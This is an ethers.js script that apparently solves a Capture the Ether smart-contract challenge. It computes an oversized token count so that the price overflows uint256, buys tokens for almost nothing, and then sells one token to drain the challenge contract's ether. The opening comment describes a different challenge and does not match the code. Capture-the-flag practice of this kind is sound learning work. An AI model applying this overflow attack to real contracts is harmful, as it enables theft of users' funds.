
const { utils, BigNumber, Contract } = require('ethers');

var { wallet, provider } = require('./common')

const contractAddress = '0x58972e59507Cf8EB428Fe145226797B730795c80';

// https://ledgerops.com/blog/capture-the-ether-part-2-of-3-diving-into-ethereum-math-vulnerabilities/

// you need to make two transactions: 
//  1. predict the future number
//  2. call the solve function, if fail, you will get the reward, otherwise you will get nothing but lost some transaction fee
async function main() {
	const iface = new utils.Interface([
		'function balanceOf(address) view returns (uint256)',
		'function isComplete() view returns (bool)',
		'function buy(uint256 numTokens) payable',
		'function sell(uint256 numTokens)',
		'constructor(address _player) payable'
	]);

	var contract = new Contract(contractAddress, iface, provider);
	var contractWithSigner = contract.connect(wallet);

	const Max = BigNumber.from(2).pow(256).sub(1);
	const Ether = utils.parseEther("1.0");
	const numTokens = Max.div(Ether).add(1);
	const value = numTokens.mul(Ether).sub(1).sub(Max);

	// // 1. call the buy function
	// var tx = await contractWithSigner.buy(numTokens, {
	// 	value: value.toHexString()
	// });
	// var result = await tx.wait();
	// console.log('buy result  : ', result);

	// // 2. call the sell function
	var tx = await contractWithSigner.sell(1);
	var result = await tx.wait();
	console.log('sell result : ', result);
}

main().catch(console.error);